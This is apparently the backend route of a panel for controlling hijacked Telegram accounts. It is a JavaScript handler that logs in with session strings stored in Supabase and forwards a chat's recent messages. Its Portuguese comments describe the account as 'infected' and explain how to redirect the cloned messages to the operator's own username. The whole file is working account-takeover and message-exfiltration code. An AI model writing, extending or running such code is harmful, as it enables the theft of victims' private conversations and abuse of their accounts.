import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { createClient } from '@supabase/supabase-js';
const { authenticate } = require('../../../lib/middleware');

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

export default async function handler(req, res) {
  // Aplica autenticação
  await authenticate(req, res, async () => {
    const { phone, fromChatId, limit } = req.body;

    const { data: sessionData } = await supabase
      .from('telegram_sessions')
      .select('session_string, owner_id')
      .eq('phone_number', phone)
      .single();

    if (!sessionData) return res.status(404).json({ error: 'Sessão não encontrada' });

    // Se não for admin, valida que a sessão pertence ao usuário logado
    if (!req.isAdmin && req.userId && sessionData.owner_id !== req.userId) {
      return res.status(403).json({ error: 'Acesso negado: esta sessão não pertence ao seu usuário.' });
    }

    const { data } = { data: { session_string: sessionData.session_string } };
  const client = new TelegramClient(new StringSession(data.session_string), apiId, apiHash, { connectionRetries: 1, useWSS: false });

  try {
    await client.connect();

    // Pega as últimas X mensagens
    const messages = await client.getMessages(fromChatId, { limit: parseInt(limit) || 10 });
    
    // Encaminha para o próprio "Saved Messages" (me) da conta infectada
    // Se quiser mandar para VOCÊ, troque 'me' pelo seu @username
    await client.forwardMessages('me', { messages: messages, fromPeer: fromChatId });

    await client.disconnect();
    res.status(200).json({ success: true, msg: `Últimas ${messages.length} mensagens clonadas para o Saved Messages da conta.` });

    } catch (error) {
      await client.disconnect();
      res.status(500).json({ error: error.message });
    }
  });
}
